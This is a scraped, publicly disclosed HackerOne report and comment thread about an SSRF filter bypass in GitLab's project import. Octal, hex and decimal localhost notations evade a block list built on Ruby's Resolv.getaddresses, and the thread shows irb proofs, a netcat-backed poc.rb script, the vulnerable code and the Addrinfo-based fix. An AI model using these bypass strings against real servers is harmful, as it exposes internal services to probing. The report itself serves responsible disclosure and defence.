---
title: "SSRF vulnerability in gitlab.com via project import."
author: edoverflow (HackerOne handle, Ed)
url: https://hackerone.com/reports/215105
date_published: 2017-03-21 (reported); disclosed 2017-11-09
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/215105
bounty: "none (Bounty: None on report page)"
vuln_class: ssrf
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim.
     Scrape note: the page had a "Show older activities" collapse; comments between 2017-03-21 and 2017-10-20 were not rendered. JSON endpoint only returned the report body. -->

Reported to: GitLab. Severity: Medium (5.4). Weakness: SSRF. Status: Resolved (fixed in GitLab 10.1.2 security release, 2017-11-08). Related CVE assigned for the Ruby bug: CVE-2017-0904 (Resolv::getaddresses). Researcher write-up: https://edoverflow.com/2017/ruby-resolv-bug/

## Report body (submitted March 21, 2017, 2:12pm UTC)

Dear GitLab bug bounty team,

### Summary

It appears as though the fix to !17286 (https://gitlab.com/gitlab-org/gitlab-ce/issues/17286) can be easily bypassed. You have blocked the usage of `http://127.0.0.1`, `http://localhost/`, etc., but `http://0177.1/` and `http://0x7f.1/`, for instance, can still be used to scan internal ports.

```
Error importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository '[REPOS PATH]/{username}/{project}.git'...
fatal: unable to access 'http://0177.1:22/': Recv failure: Connection reset by peer
```

Admittedly, you have restricted the use of certain ports, but I still believe this needs to be fixed.

### Fix

Block decimal, octal and hex localhost notation.

Best regards,
Ed

## Comments

### briann (GitLab), 2017-10-20

@edio, Thanks for the heads-up. In this case that library wouldn't help. The issue is that these alternative representations of IPs may not resolve at all depending on the host and DNS settings. In cases where that happens our SSRF protection code defaults to allowing the connection attempt and the underlying OS makes the conversion itself.

We can't simply block all non-resolving hostnames as any project saved when DNS was down would fail.

The fix we're working on merging requires a hostname to resolve before a connection is made, but not when saving a project. We'll try to get that merged before your deadline. I'll get back in touch soon!

### edoverflow, 2017-11-02 09:27 UTC

Hi @briann, Just to double-check, as stated above the deadline for public disclosure is tomorrow (Friday, 3 November 2017) and I wanted to know if you believe you will be able to provide a patch by then. Otherwise, I will have to warn people first today so that they can prepare for the actual write-up tomorrow. On top of that, just to make sure you understand everything, this deadline only applies to this report and not all my other old reports.

### briann, 2017-11-02 15:22 UTC

It looks like I made a mistake and got the date wrong. I've been telling our development and release teams that it was going public on the 15th. We do have the patches ready and merged. We're just waiting on a couple of other patches that we'd like to get included in the release as well. I'll let everyone know and see if there's a chance the release can happen before tomorrow, but it is unlikely (we have a normal release going out today). If you're unable to delay until next week we completely understand.

### edoverflow, 2017-11-02 15:26 UTC

Because of your transparency and the fact that you constantly kept me up to date, I will delay the public disclosure of this report until next week (Friday, 10 November 2017). Would that work for you?

### briann, 2017-11-02 15:29 UTC

Yes, that would be great. I know I really appreciate it since this was my screw-up. We don't perform security releases on weekends so if it doesn't go out tomorrow it will likely be Monday or Tuesday. Thanks for understanding.

### edoverflow, 2017-11-02 15:34 UTC

I publicly announced the delay: https://twitter.com/EdOverflow/status/926109833719369729

Would it be possible to show me where GitLab forwards on the IP address to the operating system? I figured out that Ruby's Resolv is unable to process the IPs provided above, but I am unable to locate where the actual forwarding takes place.

```
irb(main):001:0> require "resolv"
=> true
irb(main):002:0> Resolv.getaddress "127.0.0.1"
=> "127.0.0.1"
irb(main):003:0> Resolv.getaddress "0177.1"
Resolv::ResolvError: no address for 0177.1
 from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'
 from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'
 from (irb):3
 from /usr/bin/irb:11:in `<main>'
irb(main):004:0> Resolv.getaddress "0x7f.1"
Resolv::ResolvError: no address for 0x7f.1
 from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'
 from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'
 from (irb):4
 from /usr/bin/irb:11:in `<main>'
```

### briann, 2017-11-02 19:31 UTC

The problem stems from the Ruby Resolver library not 100% matching what will be resolved by the OS. You probably remember when you first reported this that initially I was unable to duplicate your findings. In a Rails console the "0177.1" string was resolving properly to "127.0.0.1" on both my test instances and on GitLab.com. But at some point later that day they stopped resolving at all. It could be a caching issue or an issue in the Resolver library itself, but I was unable to determine the reason why it would sometimes resolve and sometimes not. It could even depend on the configuration of whatever DNS server responds to the query.

In any case, at least for Debian/Ubuntu, the OS always seems to translate these values to 127.0.0.1 when a connection is opened... without using a DNS lookup. Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether.

### edoverflow, 2017-11-02 20:06 UTC

That makes sense. I am currently running a GitLab CE instance on Ubuntu and I can see that the OS can resolve the address by using `inet_aton()`, but Ruby's Resolv fails to resolve it.

```
$ ltrace ping 0x7f.1 2>&1 | grep 0x7f.1
inet_aton("0x7f.1", { 0x100007f }) = 1
```

By the way, I found another bypass using `http://2130706433/`:

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> Resolv.getaddress "2130706433"
Resolv::ResolvError: no address for 2130706433
 from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'
 from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'
 from (irb):2
 from /usr/bin/irb:11:in `<main>'
```

```
$ ltrace ping 2130706433 2>&1 | grep 2130706433
inet_aton("2130706433", { 0x100007f }) = 1
```

[screenshot: new_bypass.png]

I am currently investigating another potential bypass by playing around with DNS TOCTOU.

### edoverflow, 2017-11-03 11:54 UTC

#### Summary

Ah, now this is interesting. It appears that the root cause is in fact a combination of the Ruby resolver and the fact that you rely on it. It seems that it cannot be relied upon for security measures especially when it comes to blacklisting addresses. This should probably be documented somewhere.

#### Details

The following function blacklists addresses on GitLab:

```ruby
def blocked_url?(url)
  return false if url.nil?

  blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
  blocked_ips.concat(Socket.ip_address_list.map(&:ip_address))

  begin
    uri = Addressable::URI.parse(url)
    # Allow imports from the GitLab instance itself but only from the configured ports
    return false if internal?(uri)

    return true if blocked_port?(uri.port)
    return true if blocked_user_or_hostname?(uri.user)
    return true if blocked_user_or_hostname?(uri.hostname)

    server_ips = Resolv.getaddresses(uri.hostname)
    return true if (blocked_ips & server_ips).any?
  rescue Addressable::URI::InvalidURIError
    return true
  end
```

Here you are relying on Ruby's native resolver:

```ruby
server_ips = Resolv.getaddresses(uri.hostname)
```

We can replicate this on my machine:

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> []
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> return true if (blocked_ips & server_ips).any?
=> nil
```

#### The Bug

While playing around with different machines running Ubuntu, I noticed the following strange behaviour by Ruby's native resolver.

| Machine 1 | Machine 2 |
| --- | --- |
| `ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]` | `ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]` |

1) Machine 1:

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> []
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> return true if (blocked_ips & server_ips).any?
=> nil
```

2) Machine 2:

```
irb(main):008:0> Resolv.getaddresses("127.0.0.1")
=> ["127.0.0.1"]
irb(main):009:0> Resolv.getaddresses("localhost")
=> ["127.0.0.1"]
irb(main):010:0> Resolv.getaddresses("127.000.000.1")
=> []
```

3) Machine 1:

```
irb(main):002:0> Resolv.getaddresses("127.000.000.1")
=> ["127.0.0.1"]
```

This clears most things up for me now. It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on. This also explains the unusual delay times and loops for certain payloads.

I will investigate this further and maybe contact the Ruby developers to see what they have to say.

Concerning you last statement:

> Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether.

I would suggest using `Socket.getaddrinfo()` in order to determine what the OS thinks the address is and then perform the other tasks in `url_blocker.rb`.

```
irb(main):001:0> require 'socket'
=> true
irb(main):002:0> Socket.getaddrinfo("0x7f.1", nil)
=> [["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 1, 6], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 2, 17], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 3, 0]]
irb(main):003:0> Socket.getaddrinfo("0177.1", nil)
=> [["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 1, 6], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 2, 17], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 3, 0]]
irb(main):004:0> Socket.getaddrinfo("2130706433", nil)
=> [["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 1, 6], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 2, 17], ["AF_INET", 0, "127.0.0.1", "127.0.0.1", 2, 3, 0]]
```

Also just to add to the list of bypasses, here is another one that actually resolves using Ruby's Resolv on Machine 1, but completely bypasses your exclusion list:

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> Resolv.getaddress "127.000.000.001"
=> "127.0.0.1"
```

You can verify this by importing `http://127.000.000.001:22/`.

### edoverflow, 2017-11-03 13:12 UTC

Here is a simplified proof of concept:

```
$ ruby -v
ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]
$ irb
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> []
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> (blocked_ips & server_ips).any?
=> false
irb(main):006:0> uri = "127.000.001"
=> "127.000.001"
irb(main):007:0> server_ips = Resolv.getaddresses(uri)
=> []
irb(main):008:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):009:0> (blocked_ips & server_ips).any?
=> false
```

Here is a proof of concept that demonstrates the dangers of relying on Ruby's native resolver for security-related features.

1) Fire up a listener in one tab:

```
$ echo -e "HTTP/1.1 200 OK\n\nHello from netcat :)" | sudo nc -l 80
```

2) Run poc.rb (F236086):

```
$ cat poc.rb
require 'resolv'
require 'uri'
require 'net/http'

puts "IP to test:"
host = gets.strip

addrs = Resolv.getaddresses(host)
puts "Result of Resolv.getaddresses():"
puts addrs
puts "(#{addrs.length} address(es))"

uri = URI.parse("http://#{host}/")
response = Net::HTTP.get_response uri
puts "Result of fetching http://#{host}/:"
puts response.body
$ ruby poc.rb
IP to test:
127.000.001
Result of Resolv.getaddresses():
(0 address(es))
Result of fetching http://127.000.001/:
Hello from netcat :)
$ ruby poc.rb
IP to test:
0x7f.1
Result of Resolv.getaddresses():
(0 address(es))
Result of fetching http://0x7f.1/:
Hello from netcat :)
```

### edoverflow, 2017-11-03 13:17 UTC

> It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on.

The output from your very first response:

```
irb(main):010:0> uri.hostname
=> "0x7f.1"
irb(main):011:0> ips = Resolv.getaddresses(uri.hostname)
=> ["127.0.0.1"]
```

The output on my machine (Machine 1):

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> ips = Resolv.getaddresses(uri)
=> []
```

### edoverflow, 2017-11-03 14:40 UTC

Here is a full patch that should prevent this issue altogether: url_blocker.rb.patch (F236113). Please verify that you are not relying on `Resolv.getaddresses()` anywhere else in your codebase. That function is completely broken and should never be used for security-related features.

Here is the snippet of code responsible for forwarding the address on to the OS in `lib/resolv.rb`:

```ruby
begin
  raise LoadError unless /mswin|mingw|cygwin/ =~ RUBY_PLATFORM
  require 'win32/resolv'
  DefaultFileName = Win32::Resolv.get_hosts_path
rescue LoadError
  DefaultFileName = '/etc/hosts'
end
```

Link to source code: https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175

I have not had a chance to discuss this with the Ruby Core development team yet.

### edoverflow, 2017-11-03 15:09 UTC

Actually, there is no need to expand the blacklist. Here is the updated patch: url_blocker.rb.patch (F236128).

### edoverflow, 2017-11-04 12:43 UTC

I might start fuzzing `Resolv::getaddresses` just to see if I can find some more bypasses. In the mean time, here is another bypass:

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> Resolv.getaddresses("0")
=> []
```

[screenshot: Screenshot_from_2017-11-04_13-43-16.png]

### briann, 2017-11-06 16:21 UTC

@edio, I think you're seeing how difficult this problem is to solve at this level. :)

We're looking at a mix of methods now to provide comprehensive protection. Hopefully we'll get this fixed up and merged later today. I'll send you an update!

### edoverflow, 2017-11-06 16:24 UTC

Hi @briann, The worst thing is it turns out, because the issue stems from Ruby's native resolver this issue affects other applications. I have just bypassed multiple SSRF filters and a couple SSRF mitigation gems. All vendors and gem authors have been notified and I plan on publishing a security advisory for this issue alongside your security update this week.

### briann, 2017-11-06 21:18 UTC

Quick update:

We have a version going through testing now that replaces the `Resolv.getaddresses()` call with a `Addrinfo.getaddrinfo()` call. This very similar to the code you mention above that uses `Socket.getaddrinfo()`. The Ruby `Addrinfo` class is a direct mapping of the underlying `struct addrinfo` used by the OS. Hopefully we can get that into a security release tomorrow. Feel free to test yourself using something like this:

```ruby
server_ips = Addrinfo.getaddrinfo(uri.hostname, 80, nil, :STREAM).map(&:ip_address)
```

There is a second `rescue` clause needed for strings that don't resolve. (SocketError)

I think it would be a mistake to think of the Resolv library not handling these values as a bug. I would honestly expect those libraries to deal only with actual DNS queries and not get involved with lower level translations. I'll be back in touch tomorrow to let you know how things are going. Thanks again for being so patient.

### edoverflow, 2017-11-07 10:11 UTC

Hi @briann, This is great to hear! Concerning your final statement, this is a bug and is actually documented here: https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs. I am not particularly satisfied with those two little bullet points, I would expect a clear warning somewhere in the docs similar to how the Python docs do it.

Also I have finally discovered where the empty value is returned:

```ruby
# File lib/resolv.rb, line 1002
def getaddresses(name)
  ret = []
  each_address(name) {|address| ret << address}
  return ret
end
```

The Ruby Core dev team have responded to my report and we are currently discussing the issue. I will keep you updated.

### edoverflow, 2017-11-07 17:22 UTC

The bug in `Resolv::getaddresses` has been assigned CVE-2017-0904.

### briann, 2017-11-07 23:01 UTC

Ah, that's good to know. I'm used to lower level programming myself, where libraries have a more specific purpose. In the meantime we've switched over to the other library.

Our security release didn't quite make it out today but will certainly go out tomorrow. I hope that gives you enough time to reference it in your announcement later this week.

### briann closed the report, status Resolved, 2017-11-09 02:52 UTC

Hi again @edio, A patch for this vulnerability was included in our 10.1.2 security release earlier today. https://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/ Thanks again for the report!

### 2017-11-09 02:57 UTC briann requested disclosure; 17:51 UTC edoverflow agreed. Report disclosed.

### edoverflow, 2017-11-09 17:51 UTC

Fantastic work! Here is my write-up: https://edoverflow.com/2017/ruby-resolv-bug/

### briann, 2017-11-09 18:07 UTC

"ResolvBleed", eh? :)

## Metadata

Reported on March 21, 2017. Reported to GitLab. Participants: edoverflow, briann. Report Id #215105. Resolved. Severity Medium (5.4). Disclosed November 9, 2017. Weakness: SSRF. CVE ID field: None. Bounty: None.
